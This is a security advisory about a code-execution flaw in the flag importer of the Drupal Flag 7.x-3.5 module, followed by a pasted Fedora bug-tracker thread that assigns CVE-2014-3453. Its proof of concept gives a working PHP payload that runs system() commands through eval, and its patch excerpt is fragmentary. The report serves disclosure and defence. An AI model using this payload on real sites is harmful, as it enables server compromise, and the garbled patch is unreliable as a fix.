Drupal Flag 7.x-3.5 Module Vulnerability Report

Author: Ubani Anthony Balogun <ubani () sas upenn edu>
Reported: May 07, 2014

Module Description:
- -------------------
Flag is a flexible flagging system that is completely customizable by
the administrator.
Using this module, the site administrator can provide any number of
flags for nodes, comments,
users, and any other type of entity. Some possibilities include
bookmarks, marking important,
friends, or flag as offensive. With extensive views integration, you
can create custom lists of
popular content or keep tabs on important content.

Description of Vulnerability:
- -----------------------------
The Flag 7.x-3.5 module contains an improper input handling (IH)
vulnerability created by it's failure to validate user
supplied PHP code, input via it's "flag importer" form, before using
PHP's "eval" function to execute the code on the server.
Using the flag importer form, a malicious user is able to execute
arbitrary code with the permissions of the server on the host machine.

Systems Impacted:
- ----------------
Drupal 7.26 with Flag 7.x-3.0 and Flag 7.x-3.5 (current recommended
release) were tested and found to be vulnerable

Impact:
- -------
Users with the permission to use the flag importer can inject and
execute arbitrary code on the host server with server permissions.
This vulnerability can be exploited to upload a malicious payload onto
the vulnerable server, mount a Denial of Service (DoS) attack
or effect other server-side attacks.

Mitigating Factors:
- -------------------
This vulnerability is mitigated by the fact that a user must have
permission to use the flag importer. The Flag module
deactivates this permission by default for users other than site
administrators, and cautions adminsitrators against granting
this permission to other roles.

Proof of Concept:
- -----------------
1. Install and enable the Flag module
2. Using an account with permissions to use the flag importer,
navigate to the flag import page (?q=admin/structure/flags/import)
   and submit the below code via the "Flag import code" text area:

//Valid flag definition. This is required to successfully submit the
flag import form
$flags = array();
// Exported flag: "Bookmarks".
$flags['bookmarks'] = array (
  'entity_type' => 'node',
  'title' => 'Bookmarks',
  'global' => '0',
  'types' =>
  array (
    0 => 'article',
    1 => 'page',
    2 => 'people',
  ),
  'flag_short' => 'Bookmark this',
  'flag_long' => 'Add this post to your bookmarks',
  'flag_message' => 'This post has been added to your bookmarks',
  'unflag_short' => 'Unbookmark this',
  'unflag_long' => 'Remove this post from your bookmarks',
  'unflag_message' => 'This post has been removed from your bookmarks',
  'unflag_denied_text' => '',
  'link_type' => 'toggle',
  'weight' => 0,
  'show_in_links' =>
  array (
    'full' => 'full',
    'teaser' => 'teaser',
    'rss' => 'rss',
    'search_index' => 'search_index',
    'search_result' => 'search_result',
  ),
  'show_as_field' => 1,
  'show_on_form' => 1,
  'access_author' => '',
  'show_contextual_link' => 1,
  'i18n' => 0,
  'api_version' => 3,
);
// Malicious user input. Any amount of arbitrary code can be run after
here and before the "return flags" statement
system("whoami > /tmp/whoami.txt;");
system("echo \"<?php echo 'I p0wn Server now'; ?>\" >>
/tmp/do_evil.php;");
return $flags;

3. On the server machine, navigate to the /tmp directory to find the
created files "whoami.txt" and "do_evil.php".
   "whoami.txt" contains the user who executed the code above
(server). "do_evil.php" contains the PHP code submitted
    via the flag importer form above.
Note: This proof of concept assumes a linux server is being used. This
does not imply that non-linux systems are not
       vulnerable.

Patch:
- ------
The following patch mitigates the vulnerability

following function call was detected in the code: %func',
array('%func' => $match[0])));

+
   ob_start();
- -  eval($form_state['values']['import']);
+  eval($code);
   ob_end_clean();

   if (!isset($flags) || !is_array($flags)) {

Vendor Response:
- ---------------------
The Drupal Security team was contacted on May 8, 2014 and responded
that because the permissions assignment page
carries the warning "Warning: Give to trusted roles only; this
permission has security implications." a coordinated
security fix and announcement is not warranted.

| [Description](show_bug.cgi?id=1096604#c0)  Murray McAllister    2014-05-12 06:41:41 UTC  ``` The following flaw was reported to the Full Disclosure mailing list[1]:  ""  Description of Vulnerability: - ----------------------------- The Flag 7.x-3.5 module contains an improper input handling (IH) vulnerability created by it's failure to validate user supplied PHP code, input via it's "flag importer" form, before using PHP's "eval" function to execute the code on the server. Using the flag importer form, a malicious user is able to execute arbitrary code with the permissions of the server on the host machine.  Systems Impacted: - ---------------- Drupal 7.26 with Flag 7.x-3.0 and Flag 7.x-3.5 (current recommended release) were tested and found to be vulnerable  Impact: - ------- Users with the permission to use the flag importer can inject and execute arbitrary code on the host server with server permissions. This vulnerability can be exploited to upload a malicious payload onto the vulnerable server, mount a Denial of Service (DoS) attack or effect other server-side attacks.   Mitigating Factors: - ------------------- This vulnerability is mitigated by the fact that a user must have permission to use the flag importer. The Flag module deactivates this permission by default for users other than site administrators, and cautions adminsitrators against granting this permission to other roles.  ...  Vendor Response: - --------------------- The Drupal Security team was contacted on May 8, 2014 and responded that because the permissions assignment page carries the warning "Warning: Give to trusted roles only; this permission has security implications." a coordinated security fix and announcement is not warranted.  ""  [1] <http://seclists.org/fulldisclosure/2014/May/44>  A patch is available from [1].  The patch applies to drupal6-flag-2.1-1.fc20 in Fedora 20, but I have not tested whether it is really affected or not.  drupal6-flag-1.3-3.fc19 in Fedora 19 does not appear to be affected (no affected file, missing the affected functions, etc)   ```  [Comment 1](show_bug.cgi?id=1096604#c1)  Murray McAllister    2014-05-12 06:43:14 UTC  ```  Created drupal6-flag tracking bugs for this issue:  Affects: fedora-20 [[bug 1096607](show_bug.cgi?id=1096607 "CLOSED ERRATA - drupal6-flag: code execution flaw in flag importer [fedora-20]")]   ```  [Comment 3](show_bug.cgi?id=1096604#c3)  Murray McAllister    2014-05-12 07:56:39 UTC  ``` MITRE assigned [CVE-2014-3453](https://access.redhat.com/security/cve/CVE-2014-3453) to this issue:  <http://www.openwall.com/lists/oss-security/2014/05/12/2>   ```  [Comment 5](show_bug.cgi?id=1096604#c5)  Fedora Update System    2015-01-14 07:26:15 UTC  ``` drupal6-flag-2.1-3.fc20 has been pushed to the Fedora 20 stable repository.
